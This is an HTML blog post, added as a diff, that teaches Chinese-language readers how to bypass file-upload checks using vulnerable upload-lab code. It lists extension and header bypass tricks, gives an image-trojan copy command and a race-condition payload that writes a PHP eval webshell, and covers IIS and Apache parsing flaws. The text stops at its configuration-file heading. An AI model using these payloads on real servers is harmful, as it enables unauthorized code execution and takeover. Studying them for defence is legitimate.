@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">文件上传 - 高诺琪&#39;s Blog</title><meta name="Description" content="宁静致远"><meta property="og:title" content="文件上传" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://KohN0q1.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><meta property="og:image" content="https://KohN0q1.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-07-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-24T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://KohN0q1.github.io/logo.png"/>
+
+<meta name="twitter:title" content="文件上传"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://KohN0q1.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><link rel="prev" href="https://KohN0q1.github.io/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" /><link rel="next" href="https://KohN0q1.github.io/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "文件上传",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/KohN0q1.github.io\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/"
+        },"genre": "posts","wordcount":  2120 ,
+        "url": "https:\/\/KohN0q1.github.io\/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\/","datePublished": "2020-07-24T00:00:00+00:00","dateModified": "2020-07-24T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "高诺琪"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friend/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friend/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#常见校验方式">常见校验方式</a></li>
+    <li><a href="#前端验证绕过">前端验证绕过</a>
+      <ul>
+        <li><a href="#javascript验证">JavaScript验证</a></li>
+      </ul>
+    </li>
+    <li><a href="#后端验证绕过">后端验证绕过</a>
+      <ul>
+        <li><a href="#mime验证">MIME验证</a></li>
+        <li><a href="#文件头验证">文件头验证</a></li>
+        <li><a href="#黑名单校验">黑名单校验</a></li>
+        <li><a href="#条件竞争">条件竞争</a></li>
+      </ul>
+    </li>
+    <li><a href="#服务解析漏洞">服务解析漏洞</a>
+      <ul>
+        <li><a href="#iis解析漏洞">IIS解析漏洞</a>
+          <ul>
+            <li><a href="#iis60">IIS6.0</a></li>
+            <li><a href="#iis75">IIS7.5</a></li>
+          </ul>
+        </li>
+        <li><a href="#apache">Apache</a>
+          <ul>
+            <li><a href="#apache解析漏洞">Apache解析漏洞</a></li>
+            <li><a href="#cve-2017-15715">CVE-2017-15715</a></li>
+          </ul>
+        </li>
+        <li><a href="#配置文件">配置文件</a>
+          <ul>
+            <li><a href="#htaccess">.htaccess</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#操作系统相关">操作系统相关</a>
+      <ul>
+        <li><a href="#windows">windows</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">文件上传</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">高诺琪</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-24">2020-07-24</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-07-24">2020-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2120 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#常见校验方式">常见校验方式</a></li>
+    <li><a href="#前端验证绕过">前端验证绕过</a>
+      <ul>
+        <li><a href="#javascript验证">JavaScript验证</a></li>
+      </ul>
+    </li>
+    <li><a href="#后端验证绕过">后端验证绕过</a>
+      <ul>
+        <li><a href="#mime验证">MIME验证</a></li>
+        <li><a href="#文件头验证">文件头验证</a></li>
+        <li><a href="#黑名单校验">黑名单校验</a></li>
+        <li><a href="#条件竞争">条件竞争</a></li>
+      </ul>
+    </li>
+    <li><a href="#服务解析漏洞">服务解析漏洞</a>
+      <ul>
+        <li><a href="#iis解析漏洞">IIS解析漏洞</a>
+          <ul>
+            <li><a href="#iis60">IIS6.0</a></li>
+            <li><a href="#iis75">IIS7.5</a></li>
+          </ul>
+        </li>
+        <li><a href="#apache">Apache</a>
+          <ul>
+            <li><a href="#apache解析漏洞">Apache解析漏洞</a></li>
+            <li><a href="#cve-2017-15715">CVE-2017-15715</a></li>
+          </ul>
+        </li>
+        <li><a href="#配置文件">配置文件</a>
+          <ul>
+            <li><a href="#htaccess">.htaccess</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#操作系统相关">操作系统相关</a>
+      <ul>
+        <li><a href="#windows">windows</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"></br>
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>文件上传是web安全中常见的一个漏洞，也是获取服务器权限最快的方法。一些web服务允许用户上传图片或者其他文本，用户可以通过绕过上传的检测机制，上传包含恶意代码的可执行脚本文件从而获取服务器的webshell。</p>
+</br>
+<h2 id="常见校验方式" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e6%a0%a1%e9%aa%8c%e6%96%b9%e5%bc%8f" class="header-mark"></a>常见校验方式</h2><p>客户端校验：</p>
+<ul>
+<li>前端JavaScript校验</li>
+</ul>
+<p>服务器端校验：</p>
+<ul>
+<li>校验MIME</li>
+<li>校验文件头标志位</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>WAF校验</li>
+</ul>
+<br/>
+<h2 id="前端验证绕过" class="headerLink">
+    <a href="#%e5%89%8d%e7%ab%af%e9%aa%8c%e8%af%81%e7%bb%95%e8%bf%87" class="header-mark"></a>前端验证绕过</h2><h3 id="javascript验证" class="headerLink">
+    <a href="#javascript%e9%aa%8c%e8%af%81" class="header-mark"></a>JavaScript验证</h3><p>前端JavaScript验证可以通过浏览器直接禁用JavaScript来达到绕过，或者用 brup suite 抓包再将后缀名修改成网站对应的脚本语言格式来绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">//upload-pass1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//定义允许上传的文件类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">allow_ext</span> <span class="o">=</span> <span class="s2">&#34;.jpg|.png|.gif&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//提取上传文件的类型
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">ext_name</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//判断上传文件类型是否允许上传
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">allow_ext</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">ext_name</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">errMsg</span> <span class="o">=</span> <span class="s2">&#34;该文件不允许上传，请上传&#34;</span> <span class="o">+</span> <span class="nx">allow_ext</span> <span class="o">+</span> <span class="s2">&#34;类型的文件,当前文件类型为：&#34;</span> <span class="o">+</span> <span class="nx">ext_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="nx">errMsg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h2 id="后端验证绕过" class="headerLink">
+    <a href="#%e5%90%8e%e7%ab%af%e9%aa%8c%e8%af%81%e7%bb%95%e8%bf%87" class="header-mark"></a>后端验证绕过</h2><h3 id="mime验证" class="headerLink">
+    <a href="#mime%e9%aa%8c%e8%af%81" class="header-mark"></a>MIME验证</h3><p>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。</p>
+<p>当后台只验证MIME类型时，只要将 <code>content-type</code> 修改成 <code>image/jpeg</code> 、<code>image/png</code>、<code>image/gif</code> 其中一个即可绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//upload-pass2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="k">if</span> <span class="p">((</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>          
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件类型不正确，请重新上传！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="文件头验证" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e5%a4%b4%e9%aa%8c%e8%af%81" class="header-mark"></a>文件头验证</h3><p><code>getimagesize</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>
+<p>可以利用图片马来绕过该函数，再用文件包含来getshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">copy  1.jpg/b  +  cmd.php/a   shell.jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参数 <code>/b</code>  以二进制格式复制
+参数 <code>/a</code>  以ASCII格式复制</p>
+<p>或者用<code>winhex</code>伪造文件头</p>
+<p><img
+        class="lazyload"
+        data-src="/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0.assets/winhex.png"
+        data-srcset="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/winhex.png, /%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0.assets/winhex.png 1.5x, /%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/winhex.png 2x"
+        data-sizes="auto"
+        alt="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/winhex.png"
+        title="/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/winhex.png"></p>
+<p>常见图片文件头</p>
+<ul>
+<li>gif(GIF89a) : 47 49 46 38 39 61</li>
+<li>jpg; jpe; jpeg : FF D8 FF FE 00</li>
+<li>png : 89 50 4E 47 0D 0A</li>
+</ul>
+<h3 id="黑名单校验" class="headerLink">
+    <a href="#%e9%bb%91%e5%90%8d%e5%8d%95%e6%a0%a1%e9%aa%8c" class="header-mark"></a>黑名单校验</h3><p>黑名单限制很难将全部的内容过滤，可以用特殊的后缀名实现绕过</p>
+<ul>
+<li>php：php3、php4、php5、php7、phtml</li>
+<li>jsp：jspx、jspf</li>
+<li>asp：aspx、cer、cdx、asa、asax</li>
+</ul>
+<p>利用大小写绕过</p>
+<ul>
+<li>Php、PhtMl、PHp3、phP4</li>
+</ul>
+<p>利用双写进行绕过</p>
+<ul>
+<li>phphpp、pphtmlhtml</li>
+</ul>
+<p>0x00截断，php的一些函数的底层是C语言，遇到0x00会截断</p>
+<ul>
+<li>php版本&lt;5.3.4</li>
+<li>magic_quotes_gpc关闭</li>
+</ul>
+<h3 id="条件竞争" class="headerLink">
+    <a href="#%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89" class="header-mark"></a>条件竞争</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ext_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$upload_file</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$upload_file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span><span class="nv">$ext_arr</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">             <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="o">.</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">99</span><span class="p">)</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">             <span class="nx">rename</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">);</span> <span class="c1">// rename修改名称
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>             <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">unlink</span><span class="p">(</span><span class="nv">$upload_file</span><span class="p">);</span>  <span class="c1">// unlink删除文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为文件会先上传到服务器的临时目录，通过白名单验证，不符合条件的文件再通过 <code>unlink</code> 删除文件。通过不断上传图片马，内容为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在文件还没被 <code>unlink</code> 之前访问文件，则会生成一个 <code>shell.php</code> 的 webshell</p>
+</br>
+<h2 id="服务解析漏洞" class="headerLink">
+    <a href="#%e6%9c%8d%e5%8a%a1%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>服务解析漏洞</h2></br>
+<h3 id="iis解析漏洞" class="headerLink">
+    <a href="#iis%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>IIS解析漏洞</h3><h4 id="iis60" class="headerLink">
+    <a href="#iis60" class="header-mark"></a>IIS6.0</h4><p>IIS6.0存在两个很重要的asp解析漏洞：</p>
+<ul>
+<li>目录解析：以*.asp命名的文件夹里的文件都将会被当成ASP文件执行</li>
+<li>文件解析：*.asp;.jpg 文件会直接被忽略<code>;</code>，当成 *.asp文件执行</li>
+</ul>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa  *.cer *.cdx</p>
+<h4 id="iis75" class="headerLink">
+    <a href="#iis75" class="header-mark"></a>IIS7.5</h4><p>该漏洞属于PHP的解析漏洞，利用条件：php.ini里cgi.fix_pathinfo=1(默认为1)</p>
+<p>当IIS7/7.5在Fast-CGI运行模式下，在URL上访问一个文件路径( http://test.com/a.jpg) 然后在后面加上/xx.php 会将 <code>/a.jpg/xx.php</code> 解析为 php 文件。</p>
+</br>
+<h3 id="apache" class="headerLink">
+    <a href="#apache" class="header-mark"></a>Apache</h3><h4 id="apache解析漏洞" class="headerLink">
+    <a href="#apache%e8%a7%a3%e6%9e%90%e6%bc%8f%e6%b4%9e" class="header-mark"></a>Apache解析漏洞</h4><p>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。如 <code>test.php.abc </code> ，apache 无法识别 <code>abc</code> 这个后缀名就会从左往右开始识别，最后执行 <code>test.php</code></p>
+<h4 id="cve-2017-15715" class="headerLink">
+    <a href="#cve-2017-15715" class="header-mark"></a>CVE-2017-15715</h4><p>Apache httpd 2.4.0版本至2.4.29版本中存在该漏洞。这个漏洞利用方式就是上传一个文件名最后带有换行符\x0A（如<code>a.php\x0A</code>），从而绕过安全限制。具体利用方式可以看<a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener noreffer">P牛</a>的文章</p>
+</br>
+<h3 id="配置文件" class="headerLink">
